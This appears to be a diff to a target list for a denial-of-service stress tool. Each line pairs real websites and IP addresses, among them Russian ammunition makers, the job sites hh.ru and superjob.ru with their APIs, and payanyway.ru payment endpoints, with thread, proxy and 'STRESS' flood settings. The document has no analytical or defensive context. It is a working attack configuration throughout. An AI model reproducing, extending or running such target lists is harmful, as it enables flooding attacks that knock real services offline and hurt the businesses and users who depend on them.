@@ -1,3 +1,4 @@
-http://new.kspz.ru/ http://ulnammo.ru/vp/ http://www.barnaulpatron.ru/ru/ https://lztamarshal.ru/catalog/ http://www.tulammo.ru/en/ http://90.156.201.18:80 http://90.156.201.45:80 http://90.156.201.107:80 http://90.156.201.117:80 http://95.104.194.195:80 http://77.222.61.193:80 http://91.189.114.18:80 http://31.31.198.239:80 https://31.31.198.239:443 http://91.189.114.18:80 -t 1000 -p 1200 --rpc 1000 --http-methods GET STRESS
+tcp://94.124.200.0:80 tcp://94.124.200.0:443 tcp://94.124.200.1:80 tcp://94.124.200.1:443 tcp://91.206.147.1:80 tcp://91.206.147.1:443 tcp://91.206.147.2:80 -t 1000 -p 1200 --rpc 1000 --http-methods GET POST STRESS
+tcp://91.206.147.2:443 tcp://91.206.147.3:80 tcp://91.206.147.3:443 tcp://91.206.147.4:80 tcp://91.206.147.4:443 https://hh.ru https://api.hh.ru https://rest-domains.hh.ru https://www.superjob.ru https://api.superjob.ru -t 1000 -p 1200 --rpc 1000 --http-methods GET POST STRESS
 
 # https://185.111.86.13 https://apisolution.payanyway.ru https://185.111.85.29:443 https://185.111.84.213:443 https://bitrix24.payanyway.ru https://185.111.85.38 --http-methods GET STRESS -t 1000 -p 1200 --rpc 1000
